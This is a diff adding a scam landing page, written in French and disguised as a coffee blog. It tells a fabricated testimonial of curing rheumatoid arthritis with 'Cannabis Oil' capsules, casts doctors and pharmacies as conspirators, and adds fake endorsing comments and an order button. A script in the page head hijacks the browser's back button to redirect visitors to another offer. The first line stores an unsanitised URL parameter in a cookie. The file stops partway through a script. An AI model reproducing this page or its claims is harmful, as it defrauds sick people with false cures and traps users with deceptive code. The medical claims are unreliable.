@@ -1,0 +1,557 @@
+<?php setcookie("FBpixel", $_GET["fbpixel"]); ?>
+<!DOCTYPE html>
+
+<!--[if IE 8]>
+<html class="lt-ie10 lt-ie9"> <![endif]-->
+<!--[if IE 9]>
+<html class="lt-ie10"> <![endif]-->
+<!--[if gt IE 9]><!-->
+<html><!--<![endif]-->
+<head>
+
+
+
+  <meta charset="utf-8">
+
+
+  <title>Coffee Lover's Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.js"></script>
+  <script src="drewlex_main.js"></script>
+  <script>
+      (function () {
+          let params = (new URL(document.location)).searchParams;
+          let block = '';
+          params.forEach(function (value, key) {
+              block = block + key + '=' + value + '&';
+          })
+          var t;
+          try {
+              for (t = 0; 10 > t; ++t) history.pushState({}, "", document.location);
+              onpopstate = function (t) {
+                  t.state && location.replace("domonetka/index.php?cid={clickid}")
+              }
+          } catch (o) {}
+      })();
+  </script>
+  <style>
+    figure {
+      margin: 0
+    }
+
+    .tmblr-iframe {
+      position: absolute
+    }
+
+    .tmblr-iframe.hide {
+      display: none
+    }
+
+    .tmblr-iframe--amp-cta-button {
+      visibility: hidden;
+      position: fixed;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 100
+    }
+
+    .tmblr-iframe--amp-cta-button.tmblr-iframe--loaded {
+      visibility: visible;
+      animation: iframe-app-cta-transition .2s ease-out
+    }</style>
+
+
+  <link rel="stylesheet" media="screen" href="index.build.css">
+  <link rel="stylesheet" href="main-min.css">
+  <style>
+    /* Colors */
+    body {
+      background: #202020;
+    }
+
+    .blog-title {
+      font-family: 'Grumpy Black 48', serif, "Helvetica Neue", HelveticaNeue, Arial, sans-serif;
+      font-weight: bold;
+    }
+
+    .blog-title a,
+    .description,
+    .search-no-results,
+    .likes-no-likes,
+    .related-posts-wrapper > h2,
+    .loader .loader-bar,
+    .widget-title {
+      color: #cebbb6;
+    }
+
+    a {
+      color: #e7dbd8;
+    }
+
+    #pagination a,
+    .nav-wrapper .nav-item .label {
+      color: #e7dbd8;
+    }
+
+    #pagination a.next:after {
+      border-left-color: #e7dbd8;
+    }
+
+    #pagination a.previous:after {
+      border-right-color: #e7dbd8;
+    }
+
+    .user-avatar {
+      background-color: #202020;
+      border-color: #202020;
+    }
+
+    .avatar-style-square .user-avatar {
+      -webkit-box-shadow: 0 0 0 4px #202020;
+      box-shadow: 0 0 0 4px #202020;
+    }
+
+    .no-header-image .logo-wrapper,
+    .contain-header-image .logo-wrapper {
+      color: #e7dbd8;
+    }
+
+    /* Adjust logo for light accents on light backgrounds */
+    .light-on-light.no-header-image .logo-wrapper,
+    .light-on-light.contain-header-image .logo-wrapper {
+      color: #444;
+    }
+
+    /* Adjust logo for dark accents on dark backgrounds */
+    .dark-on-dark.no-header-image .logo-wrapper,
+    .dark-on-dark.contain-header-image .logo-wrapper {
+      color: #fff;
+    }
+
+    /* Sticky nav colors */
+    .nav-fixed {
+      background-color: #202020;
+    }
+
+    .nav-responsive .inline-nav::after {
+      background-image: linear-gradient(left, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 1) 100%);
+      background-image: -webkit-linear-gradient(left, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 1) 100%);
+      background-image: -moz-linear-gradient(left, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 1) 100%);
+      background-image: -ms-linear-gradient(left, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 1) 100%);
+      background-image: -o-linear-gradient(left, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 1) 100%);
+    }
+
+    @media screen and (max-device-width: 568px) {
+      .header-image.cover {
+        background-image: url(../https@static.tumblr.com/e20d0c81adb942fe18ddf34eba30c366/57rnx1j/5fRq1xnrn/tumblr_static_4kaly7xtyr28owo4oo0gss4w8_640_v2.jpg);
+        -webkit-background-size: cover;
+        background-size: cover;
+      }
+
+      .avatar-style-square .user-avatar {
+        -webkit-box-shadow: 0 0 0 3px #202020;
+        -moz-box-shadow: 0 0 0 3px #202020;
+        box-shadow: 0 0 0 3px #202020;
+      }
+
+    }
+
+    /* Custom CSS */
+
+  </style>
+
+
+
+</head>
+<body data-urlencoded-name="annacoffeelover" class="wide index-page no-header-image display-related-posts">
+
+<div class="app-nag">
+  <div class="app-nag-header clearfix">
+    <div class="app-nag-icon">
+      <div class="app-nag-icon-ios">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg"  x="0px" y="0px" viewBox="0 0 1024 1024" enable-background="new 0 0 1024 1024" xml:space="preserve">
+                            <path fill="#36465D" d="M1024,771c0,139.2-113.8,253-253,253H253C113.8,1024,0,910.2,0,771V253C0,113.8,113.8,0,253,0h518 c139.2,0,253,113.8,253,253V771z"></path>
+                    <path fill="none" stroke="#FFF100" stroke-width="4" stroke-miterlimit="10" d="M463.9,209.4"></path>
+                    <path opacity="0.6" fill="#231F20" d="M628.1,681c8.2,0,17.1-1.2,25.8-3.3V530.3h111.6V401.8h-68.6V473H585.4v162.4 C586,676.3,609.1,681,628.1,681z M654.4,250.5h-68.6v94h68.6V250.5z M754.3,722.9c-12.7,7.1-28.9,12.4-44.3,14.5l11.4,33.8 c-20.5,27-71.4,45.5-118.1,46.3c-1.6,0-3.1,0-4.7,0c0,0,0,0,0,0c-32.5,0-59.5-5.7-81.9-15.3c26.2,40,72.7,72.6,150.5,72.6c0,0,0,0,0,0c1.6,0,3.1,0,4.7,0c46.6-0.8,97.6-19.4,118.1-46.3L754.3,722.9z"></path>
+                    <path fill="none" stroke="#FFF100" stroke-width="4" stroke-miterlimit="10" d="M355,359.5"></path>
+                    <path fill="#FFFFFF" d="M577.5,830.6c65.1,0,129.7-23.2,151-51.3l4.3-5.6l-40.4-119.7c-0.4-1.1-1.4-1.9-2.6-1.9h-7.6h-3.5l-79.1,0 c-1.2,0-2.3-0.8-2.6-2c-1.1-4-1.7-8.9-1.8-14.9V489c0-1.5,1.2-2.7,2.7-2.7h106.1c1.5,0,2.7-1.2,2.7-2.7V333.8c0-1.5-1.2-2.7-2.7-2.7 H598.4c-1.5,0-2.7-1.2-2.7-2.7V182.5c0-1.5-1.2-2.7-2.7-2.7h-82.6h-28.9h-73.8c-13.3,0-28.5,9.8-30.8,28 c-9.3,75.3-43.8,120.5-108.7,142.2l-7.2,2.4c-1.1,0.4-1.9,1.4-1.9,2.6v128.6c0,1.5,1.2,2.7,2.7,2.7h50.4h0h15.9c0,0,0,120,0,158.3 C328.1,771,415.7,830.6,577.5,830.6z M701.6,769.5c-20.3,19.5-62,34.1-102,34.7c-1.5,0-3,0-4.5,0h0 c-131.5,0-166.6-100.4-166.6-159.7V462.3c0-1.5-1.2-2.7-2.7-2.7h-63.6c-1.5,0-2.7-1.2-2.7-2.7v-83c0-1.1,0.7-2.1,1.7-2.5 c68-26.5,105.9-79,115.9-160.3c0.6-4.5,4.3-4.6,4.3-4.6h84.9c1.5,0,2.7,1.2,2.7,2.7v145.9c0,1.5,1.2,2.7,2.7,2.7h105.7 c1.5,0,2.7,1.2,2.7,2.7v96.4c0,1.5-1.2,2.7-2.7,2.7H571.3c-1.5,0-2.7,1.2-2.7,2.7l0,173.2c0.6,39,19.5,58.8,56.1,58.8 c14.7,0,31.6-3.4,47.1-9.3c1.4-0.6,3,0.2,3.5,1.6l27,80C702.6,767.7,702.4,768.8,701.6,769.5z"></path>
+                    <path opacity="0.5" fill="#2D3F54" d="M328.1,528.9h73.8v-40.2c0-1.3-1.1-2.4-2.4-2.4h-71.4V528.9z"></path>
+                        </svg>
+      </div>
+      <div class="app-nag-icon-android">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg"  x="0px" y="0px" viewBox="0 0 1024 1024" enable-background="new 0 0 1024 1024" xml:space="preserve">
+                            <path fill="none" stroke="#FFF100" stroke-width="4" stroke-miterlimit="10" d="M463.9,209.4"></path>
+                    <path opacity="0.5" fill="#231F20" d="M628.1,681c8.2,0,17.1-1.2,25.8-3.3V530.3h111.6V401.8h-68.6V473H585.4v162.4 C586,676.3,609.1,681,628.1,681z M654.4,250.5h-68.6v94h68.6V250.5z M754.3,722.9c-12.7,7.1-28.9,12.4-44.3,14.5l11.4,33.8 c-20.5,27-71.4,45.5-118.1,46.3c-1.6,0-3.1,0-4.7,0c0,0,0,0,0,0c-32.5,0-59.5-5.7-81.9-15.3c26.2,40,72.7,72.6,150.5,72.6c0,0,0,0,0,0c1.6,0,3.1,0,4.7,0c46.6-0.8,97.6-19.4,118.1-46.3L754.3,722.9z"></path>
+                    <path fill="none" stroke="#FFF100" stroke-width="4" stroke-miterlimit="10" d="M355,359.5"></path>
+                    <path fill="#36465D" d="M577.5,830.6c65.1,0,129.7-23.2,151-51.3l4.3-5.6l-40.4-119.7c-0.4-1.1-1.4-1.9-2.6-1.9h-7.6h-3.5l-79.1,0 c-1.2,0-2.3-0.8-2.6-2c-1.1-4-1.7-8.9-1.8-14.9V489c0-1.5,1.2-2.7,2.7-2.7h106.1c1.5,0,2.7-1.2,2.7-2.7V333.8c0-1.5-1.2-2.7-2.7-2.7 H598.4c-1.5,0-2.7-1.2-2.7-2.7V182.5c0-1.5-1.2-2.7-2.7-2.7h-82.6h-28.9h-73.8c-13.3,0-28.5,9.8-30.8,28 c-9.3,75.3-43.8,120.5-108.7,142.2l-7.2,2.4c-1.1,0.4-1.9,1.4-1.9,2.6v128.6c0,1.5,1.2,2.7,2.7,2.7h50.4h0h15.9c0,0,0,120,0,158.3 C328.1,771,415.7,830.6,577.5,830.6z M701.6,769.5c-20.3,19.5-62,34.1-102,34.7c-1.5,0-3,0-4.5,0h0 c-131.5,0-166.6-100.4-166.6-159.7V462.3c0-1.5-1.2-2.7-2.7-2.7h-63.6c-1.5,0-2.7-1.2-2.7-2.7v-83c0-1.1,0.7-2.1,1.7-2.5 c68-26.5,105.9-79,115.9-160.3c0.6-4.5,4.3-4.6,4.3-4.6h84.9c1.5,0,2.7,1.2,2.7,2.7v145.9c0,1.5,1.2,2.7,2.7,2.7h105.7 c1.5,0,2.7,1.2,2.7,2.7v96.4c0,1.5-1.2,2.7-2.7,2.7H571.3c-1.5,0-2.7,1.2-2.7,2.7l0,173.2c0.6,39,19.5,58.8,56.1,58.8 c14.7,0,31.6-3.4,47.1-9.3c1.4-0.6,3,0.2,3.5,1.6l27,80C702.6,767.7,702.4,768.8,701.6,769.5z"></path>
+                    <path opacity="0.5" fill="#2D3F54" d="M328.1,528.9h73.8v-40.2c0-1.3-1.1-2.4-2.4-2.4h-71.4V528.9z"></path>
+                        </svg>
+      </div>
+    </div>
+    <div class="app-nag-ratings">
+      <svg width="181px" height="30px" viewBox="0 0 181 30" version="1.1" xmlns="http://www.w3.org/2000/svg">
+        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+          <path d="M15.8,25.2 L6.1,29.8 L7.5,19.2 L0.1,11.4 L10.6,9.5 L15.8,0 L20.9,9.5 L31.4,11.4 L24,19.2 L25.4,29.8 L15.8,25.2 Z" fill="#FFC00E"></path>
+          <path d="M52.8,25.2 L43.1,29.8 L44.5,19.2 L37.1,11.4 L47.6,9.5 L52.8,0 L57.9,9.5 L68.4,11.4 L61,19.2 L62.4,29.8 L52.8,25.2 Z" fill="#FFC00E"></path>
+          <path d="M89.8,25.2 L80.1,29.8 L81.5,19.2 L74.1,11.4 L84.6,9.5 L89.8,0 L94.9,9.5 L105.4,11.4 L98,19.2 L99.4,29.8 L89.8,25.2 Z" fill="#FFC00E"></path>
+          <path d="M126.8,25.2 L117.1,29.8 L118.5,19.2 L111.1,11.4 L121.6,9.5 L126.8,0 L131.9,9.5 L142.4,11.4 L135,19.2 L136.4,29.8 L126.8,25.2 Z" fill="#FFC00E"></path>
+          <path d="M163.8,25.2 L154.1,29.8 L155.5,19.2 L148.1,11.4 L158.6,9.5 L163.8,0 L168.9,9.5 L179.4,11.4 L172,19.2 L173.4,29.8 L163.8,25.2 Z" fill="#E7E7E7"></path>
+          <path d="M163.3,25.1 L154.1,29.8 L155.5,19.2 L148.1,11.4 L158.6,9.5 L163.3,0.9 L163.3,25.1 Z" fill="#FFC00E"></path>
+        </g>
+      </svg>
+      <div class="app-nag-ratings-text app-nag-ratings-text-android">
+        1.5M ratings
+      </div>
+      <div class="app-nag-ratings-text app-nag-ratings-text-ios">
+        277k ratings
+      </div>
+    </div>
+    <div class="app-nag-close-button">
+      <svg width="15px" height="15px" viewBox="0 0 30 30" version="1.1" xmlns="http://www.w3.org/2000/svg">
+        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+          <path d="M12.510351,14.6860639 L0,27.1964147 L2.175713,29.3721278 L14.686064,16.8617771 L27.196415,29.3721278 L29.372128,27.1964147 L16.861777,14.6860639 L29.372128,2.1757132 L27.196415,0 L14.686064,12.5103507 L2.175713,0 L0,2.1757132 L12.510351,14.6860639 L12.510351,14.6860639 Z" fill="#D3D3D3"></path>
+        </g>
+      </svg>
+    </div>
+  </div>
+  <div class="app-nag-body">
+    <h1 class="app-nag-callout">See, that’s what the app is perfect for.</h1>
+    <a class="app-nag-large-button app-nag-app-store-link button blue">Sounds perfect</a>
+    <a class="app-nag-large-button app-nag-app-store-deny">Wahhhh, I don’t wanna</a>
+  </div>
+</div>
+
+<section id="page">
+  <div class="header-wrapper
+
+                no-image
+
+                avatar-style-circle">
+
+    <header id="header" class="top-blog-header">
+
+
+      <div class="blog-title-wrapper content">
+        <figure class="avatar-wrapper animate">
+          <a href="" style="background-image: url(1.jpg)" class="user-avatar">
+            <img src="1.jpg" alt="" class="print-only invisible">
+          </a>
+        </figure>
+
+        <div class="title-group animate">
+          <h1 class="blog-title"><a class="lt5" href="">Le Blog des amateurs de café</a></h1>
+          <span class="description"></span>
+        </div>
+      </div>
+    </header>
+  </div>
+  <div class="nav-wrapper nav-responsive">
+    <nav class="nav-menu">
+      <ul class="inline-nav">
+        <li class="nav-item nav-item--posts">
+          <a class="label current-page lt6" href="">Posts</a>
+        </li>
+        <li class="nav-item nav-item--likes">
+          <a class="label lt7" href="">Likes</a>
+        </li>
+        <li class="nav-item nav-item--following">
+          <a class="label lt8" href="">Suivant</a>
+        </li>
+        <li class="nav-item nav-item--archive">
+          <a class="label external-page lt9" href="">Archiver</a>
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <section class="content clearfix no-image avatar-style-circle show-nav" id="posts">
+    <div class="container">
+      <div class="main">
+        <article class="text not-page post-189449602542" data-post-id="189449602542">
+          <div class="post-wrapper clearfix">
+            <header class="post-header"></header>
+            <section class="post">
+              <div class="post-content">
+                <h2 class="title">
+                  <a class="lt10" href="">Les maladies articulaires ne sont pas une phrase. Expérience personnelle: j'ai vaincu la polyarthrite rhumatoïde contrairement à tous les pronostics</a>
+                </h2>
+                <style class="lt11">
+                  .body-text img {
+                    display: block;
+                    width: 100%;
+                    margin: 10px auto;
+                  }
+
+                  .body-text a, .feed-z a {
+                    color: #00b8ff;
+                  }
+                </style>
+                <div class="body-text"><br>
+                  <p class="lt12">Bonjour, je m'appelle Marie, j'ai 31 ans. Il y a plus de six ans, j'ai reçu un diagnostic de polyarthrite rhumatoïde.</p>
+                  <img alt="" src="2.jpg">
+                  <p class="lt13">Oui, les problèmes articulaires ne concernent pas seulement les personnes âgées. Dans la zone à risque - nous sommes tous, indépendamment de l'âge et du sexe.</p>
+                  <p class="lt14">Aujourd'hui, tout le monde connaît le cancer le SIDA... sur le fait que l'humanité est constamment à la recherche d'un moyen de les guérir complètement. Mais le diagnostic de la polyarthrite rhumatoïde, hélas, est rarement dit. Et ils ne cherchent pas de médicaments. Bien que chaque patient sache: il est complètement impossible de se débarrasser de la maladie. Eh bien, au moins, c'est ce que nous disent les médecins.</p>
+                  <p class="lt15"> Et je peux deviner à quoi ce «silence» est lié. Un remède pour cette maladie existe déjà. Je l'ai trouvé et essayé sur moi - même.</p>
+                  <p class="lt16">Maintenant, les médecins, que j'ai rencontré pendant des années de souffrance, sont perplexes: un miracle s'est produit-pas autrement! La polyarthrite rhumatoïde n'est pas traitée! Ils disent, fille, votre cas est un phénomène, vous devez passer à l'institut «sur les expériences».</p>
+                  <p class="lt17">Je choque encore plus la montagne Esculape: je ne suis pas seule, nous sommes des milliers. Non seulement les patients souffrant d'arthrite «désespérément» ont été guéris. Un grand nombre de personnes atteintes de diverses maladies articulaires dégénératives sont revenues à une vie active à part entière. Mais à propos de tout dans l'ordre.</p>
+                  <p>
+                    <i class="lt18" style="text-decoration: underline">Donc, comme je l'ai dit, tout a commencé il y a six ans.</i>
+                  </p>
+                  <p class="lt19">La première «cloche» désagréable était la raideur matinale dans les mains. Les médecins ont dit: tout le travail de la faute à l'ordinateur.</p>
+                  <p class="lt20">Plus tard, non seulement les mains, mais aussi les jambes ont commencé à faire mal. Se lever du lit est devenu une torture quotidienne – les 20 à 40 premières minutes après le réveil semblaient être un cauchemar. La douleur dans les mains s'est dissipée au point que je ne pouvais plus m'habiller moi-même jusqu'à ce que l'analgésique fonctionne.</p>
+                  <p class="lt21">La randonnée chez le médecin et les résultats des tests m'ont finalement amené chez le rhumatologue. Le médecin âgé se tenait sur son: «Bébé, habillez-vous plus chaud et n'inventez pas. Vous n'avez pas de polyarthrite rhumatoïde.» Deux ans plus tard, je suis de nouveau à la réception de cette grand-mère, et elle a reconnu son erreur «cela arrive et ainsi de suite».</p>
+                  <p class="lt22">Ces médecins ne sont ni un ni deux. Croyez-moi, un patient expérimenté de rhumatologues, dans cette industrie de la médecine, il y a une profanation continue. J'ai eu de la chance d'aller voir un professionnel. Mais avant que cela ne se produise, j'ai entendu le proverbial mille fois: «l'Arthrite n'est pas traitée. Apprenez à vivre avec lui».</p>
+                  <p><b><i class="lt23">«Quel genre de conneries?! Vous n'êtes pas traité vous-même».</i></b></p>
+                  <p class="lt24">J'ai seulement 25 ans. Je suis jeune et j'ai plein de projets. J'ai décidé par tous les moyens de trouver un remède qui ramènerait ma vie pleine.</p>
+                  <img alt="" src="3.jpg">
+                  <p class="lt25">Juste avant que j'aie développé de l'arthrite, j'ai abandonné mon ancien travail et je suis devenu un barista. J'adorais cette leçon. J'avais déjà un plan d'affaires pour les prochaines années. Mais le désespoir couvrait de plus en plus. Après avoir fait mon travail à plusieurs reprises, je suis revenue au fait que je ne pouvais pas soulever la tasse de la table par moi-même. Je n'ai tout simplement pas assez de force physique pour continuer à faire mon truc préféré.</p>
+                  <p><b><i class="lt26">Le rêve – être!</i></b></p>
+                  <img alt="" src="4.jpg">
+                  <p class="lt27">Aujourd'hui, je me réveille tous les jours à 6 heures du matin (sans analgésiques) et je vais travailler dans mon propre café préféré<b>«Choco Bean»</b>. Moi - même, avec beaucoup de plaisir (sans ressentir de douleur), je prépare des boissons pour mes clients. Et même les tasses que je soulève moi-même. Et pas seulement eux!
+                  </p>
+                  <p class="lt28">Oui, comme indiqué ci-dessus, j'ai eu la chance de trouver un bon médecin. J'ai attendu trois mois pour la réception. Afin d'éviter une augmentation répétée du nombre de clients, ce médecin a demandé de ne pas mentionner son nom dans l'article. Il est l'un des rares qui, contrairement à l'opinion publique, dit: «l'arthrite est traitée!». Et renforce ses mots avec des milliers d'exemples de sa propre pratique médicale. Voici, par exemple, devant vous, je suis une confirmation vivante que l'arthrite est traitée.</p>
+                  <p class="lt29">Après avoir traversé toutes les tourments que cette maladie apporte, je ressens beaucoup de compassion pour les personnes ayant des articulations douloureuses. Et je comprends que tout le monde ne sera pas une noix forte, comme moi. Combien de personnes ont convaincu les pseudo-médecins que la douleur fait désormais partie intégrante de leur vie? Je suis pressé de vous épargner la nécessité d'attendre des mois dans la file d'attente pour un rendez-vous: J'ai soigné l'arthrite avec des capsules de
+                    <a href=""><span class="productName"></span>.</a></p>
+                  <p class="lt30">Vous avez probablement entendu parler des chondroprotecteurs. Ainsi, le
+                    <a href=""><span class="productName"></span></a> en capsules est un chondroprotecteur inhabituel. On parle de lui comme du seul chondroprotecteur de cinquième génération. Il ne protège pas seulement les articulations de la destruction, mais contribue à leur récupération. De plus, les capsules de
+                    <a href=""><span class="productName"></span></a> soulagent la douleur, l'inflammation et sont complètement naturelles.
+                  </p>
+                  <img alt="" src="prod.png" style="max-width:300px">
+                  <p class="lt31">Tout au long de l'article, j'ai essayé de contourner soigneusement le sujet du complot de pharmacie. Mais cette hypothèse se pose de lui-même: d'abord, la propagande omniprésente – le traitement de l'arthrite est seulement symptomatique. Nous sommes «plantés» sur des analgésiques et d'autres médicaments qui ne soulagent que les symptômes. Et frapper le portefeuille est le moins de maux. Quels sont les médicaments antiarthrite de la pharmacie et quels sont leurs effets secondaires-j'ai testé sur ma propre peau.</p>
+                  <p class="lt32">Eh bien, deuxièmement: trouver
+                    <a href=""><span class="productName"></span></a> c'est impossible dans les pharmacies. Vous savez pourquoi... mais je veux vous rassurer. Mon médecin traitant a partagé un lien vers le site officiel du fabricant, où il achète le médicament pour ses clients.
+                    <a href=""><span class="productName"></span></a> convient pour le traitement d'un large éventail de maladies articulaires - de l'arthrite et de l'arthrose aux blessures traumatiques temporaires.
+                  </p>
+                  <a class="lt33" href="" style="padding: 10px; width: 200px; background: #529ecc; display: flex; justify-content: center; align-items: center; font-weight: 900; color: #fff; font-size: 21px; margin: 20px auto; text-decoration: none">Commander</a>
+                  <p class="lt34">Je sais de première main à quel point les mots de soutien sont précieux quand vous êtes dans la lutte quotidienne avec votre propre corps. Et combien il est important de ne pas perdre espoir. Par conséquent, pour résumer votre histoire, je veux dire-n'abandonnez jamais. Ne croyez pas ce qu'ils disent malgré la popularité de cette opinion. Allez à votre objectif, croyez au meilleur et ne baissez pas les mains.</p>
+                  <p class="lt35">Eh bien, en arrivant au succès, donnez un coup de main aux autres.</p>
+                  <p class="lt36"><i> Je considère ma mission accomplie.</i>😊</p>
+                  <img alt="" src="5.png">
+                  <div class="features-wrapper"></div>
+                  <style>
+                    .wheel img{
+                      margin: 0;
+                    }
+                  </style>
+                </div>
+                <h1 class="lt37"> Commentaires:</h1>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt38" style="padding: 3px 0; font-weight: 900;">Аmelia:</div>
+                  <p class="lt39" style="padding-left: 15px">C'était juste l'autre jour dans «Choco Bean», il y a beaucoup de classe. Bonne chance et force!<span style="display: block; margin: 10px;"><b>Marie:</b><br> Merci beaucoup!</span>
+                  </p>
+                </div>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt40" style="padding: 3px 0; font-weight: 900;">Lola:</div>
+                  <p class="lt41" style="padding-left: 15px">C'est à propos de moi, en tête-à-tête. J'ai lutté avec l'arthrite pendant des années 13, les hormones ont commencé à prendre 10 ans après le diagnostic. Eh bien, j'ai planté la santé... je Ne me suis pas assise non plus. J'ai étudié toute la littérature sur Internet sur cette maladie, j'ai été sur tous les forums. Ne comptez pas sur les médecins. Ce n'est qu'en étudiant la question par moi-même que j'ai pu trouver la vérité. Je sais-je sais, Marie, de qui vous parlez! Mais, puisque notre cher ami a voulu rester incognito - je n'ose pas l'appeler. J'ai aussi été traitée avec ce rhumatologue. Et oui, aussi guéri avec l'aide de <span class="productName"></span>.<span style="display: block; margin: 10px;"><b>Marie:<br>Lola,</b> cette maladie oblige à se renseigner sur elle-même. Vous êtes un grand malin!</span>
+                  </p>
+                </div>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt42" style="padding: 3px 0; font-weight: 900;">Diane:</div>
+                  <p class="lt43" style="padding-left: 15px">Des gens comme l'héroïne de cette histoire admirent. Nous, les gens sans diagnostic terrible, nous vivons tous dans des bagatelles, nous déchirons nos âmes à cause de l'insignifiant, oubliant que le plus important est la santé.</p>
+                </div>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt44" style="padding: 3px 0; font-weight: 900;">Margo:</div>
+                  <p class="lt45" style="padding-left: 15px">L'héroïne de l'histoire est incroyable! Je n'ai pas moi — même d'arthrite-arthrose, a commencé à 18 ans en raison de la surcharge constante associée à la profession (je suis musicien). J'ai également essayé d'être traité — à mon avis, cela n'a fait qu'empirer: d'abord, ils ont également posé le mauvais diagnostic, puis ils ont injecté de l'acide hyaluronique dans l'articulation. Maintenant, je comprends à quel point c'était injustifié-dans mon cas, cela n'en valait pas la peine. En conséquence, les deux dernières années, il n'y avait pas un jour pour que l'articulation ne soit pas douloureuse. Je ne peux pas plier ma main, je ne peux pas m'appuyer dessus, en général je ne peux pas faire beaucoup de choses, même en termes quotidiens. C'est vraiment démotivant. Et surtout effrayant, parce qu'avant de tomber malade - je pensais que nous avons des maladies incurables de tout-rien, le cancer et le sida. Et il s'avère qu'un tel tas de gens souffrent avec des articulations, des ligaments, des tendons — et, il s'avère, la solution au problème existe! Marie, merci beaucoup! Commanda
+                    <a href=""><span class="productName"></span>.</a> Vous m'a sauvé, peut-être. Vous savez ce que sont les mains d'un pianiste et à quel point la santé des articulations est importante. Vais me soigner!<span style="display: block; margin: 10px;"><b>Анна:</b><br> S'il vous plaît! Portez-vous bien!</span>
+                  </p>
+                </div>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt46" style="padding: 3px 0; font-weight: 900;">Monique:</div>
+                  <p class="lt47" style="padding-left: 15px">Il y a un an, j'ai reçu un diagnostic de "polyarthrite rhumatoïde". Depuis, j'ai beaucoup appris sur cette maladie et je continue à étudier le problème. Merci beaucoup pour l'article, l'inspiration et
+                    <a href=""><span class="productName"></span>!</a></p>
+                </div>
+                <div class="feed-z" style="margin-left: 10px;padding: 5px 5px 10px 5px; border-bottom: 1px solid #b8860b61;">
+                  <div class="lt48" style="padding: 3px 0; font-weight: 900;">Emma:</div>
+                  <p class="lt49" style="padding-left: 15px">Marie, ma mère a été traitée avec ce docteur aussi! Elle souffrait de sciatique depuis dix ans. <span class="productName"></span> l'a sauvée, pour la deuxième année littéralement flottant, la maladie ne se souvient pas…<span style="display: block; margin: 10px;"><b>Marie:<br></b> La santé continue de votre mère!</span>
+                  </p>
+                </div>
+              </div>
+              <section class="inline-meta post-extra"></section>
+            </section>
+            <section class="panel">
+              <footer class="post-footer">
+                <section class="panel">
+                  <section class="inline-meta date-notes">
+                    <div class="date-note-wrapper">
+                      <a class="meta-item post-date lt50" href="" title="21 hours ago">Decembre 3, 2019</a>
+                    </div>
+                  </section>
+                  <section class="post-controls">
+                    <div class="controls-wrapper">
+                      <div class="control share-control">
+                        <nav class="pop">
+                          <a class="share selector" href=""></a>
+                          <div class="pop-menu share-menu south" id="share_189449602542">
+                            <ul>
+                              <li class="open-in-app">
+                                <a class="share-item open-in-app lt51" data-post="189449602542" href="">Ouvert en app</a>
+                              </li>
+                              <li>
+                                <a class="share-item facebook lt52" href="" target="_blank">Facebook</a>
+                              </li>
+                              <li>
+                                <a class="share-item twitter lt53" href="" target="_blank">Tweet</a>
+                              </li>
+                              <li>
+                                <a class="share-item reddit lt54" href="" target="_blank">Reddit</a>
+                              </li>
+                              <li>
+                                <a class="share-item mail lt55" href="">Mail</a>
+                              </li>
+                              <li>
+                                <a class="share-item permalink lt56" href="">Embed</a>
+                              </li>
+                              <li>
+                                <a class="share-item permalink lt57" href="">Permalink<i class="arrow"></i></a>
+                              </li>
+                            </ul>
+                          </div>
+                        </nav>
+                      </div>
+                      <div class="control reblog-control">
+                        <a class="reblog_button" href="" style="display: block;width:24px;height:24px;">
+                          <svg height="100%" viewBox="0 0 21 21" width="100%" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M5.01092527,5.99908429 L16.0088498,5.99908429 L16.136,9.508 L20.836,4.752 L16.136,0.083 L16.1360004,3.01110845 L2.09985349,3.01110845 C1.50585349,3.01110845 0.979248041,3.44726568 0.979248041,4.45007306 L0.979248041,10.9999998 L3.98376463,8.30993634 L3.98376463,6.89801007 C3.98376463,6.20867902 4.71892527,5.99908429 5.01092527,5.99908429 Z"></path>
+                            <path d="M17.1420002,13.2800293 C17.1420002,13.5720293 17.022957,14.0490723 16.730957,14.0490723 L4.92919922,14.0490723 L4.92919922,11 L0.5,15.806 L4.92919922,20.5103758 L5.00469971,16.9990234 L18.9700928,16.9990234 C19.5640928,16.9990234 19.9453125,16.4010001 19.9453125,15.8060001 L19.9453125,9.5324707 L17.142,12.203"></path>
+                          </svg>
+                        </a>
+                      </div>
+                      <div class="control like-control">
+                        <div class="like_button" data-blog-name="annacoffeelover" data-post-id="189449602542" id="like_button_189449602542"></div>
+                      </div>
+                    </div>
+                  </section>
+                </section>
+                <section class="inline-meta date-notes"></section>
+              </footer>
+            </section>
+          </div>
+        </article>
+      </div><!-- .main -->
+      <div class="sidebar"></div><!-- .sidebar -->
+    </div><!-- .container -->
+  </section>
+  <footer class="content clearfix" id="footer"></footer>
+</section>
+
+<style class="lt58">
+  .tmblr-iframe.tmblr-iframe--follow-teaser.open {
+    display: none !important;
+    opacity: 0 !important;
+    width: 0;
+    height: 0;
+    position: absolute;
+    left: -10000px;
+  }
+</style>
+
+
+<script>
+    const offer_params = {
+        priceMain : '39',
+        customPriceOld: '',//вказуєм свою стару ціну якщо не підходить звичайна ціна *2
+        currencyMain: '€',
+        productName : 'Cannabis Oil',
+    };
+
+
+    var productName = document.getElementsByClassName("productName");
+    var priceMain = document.getElementsByClassName("priceMain");
+    var priceOld = document.getElementsByClassName("priceOld");
+    var currencyMain = document.getElementsByClassName("currencyMain");
+
+
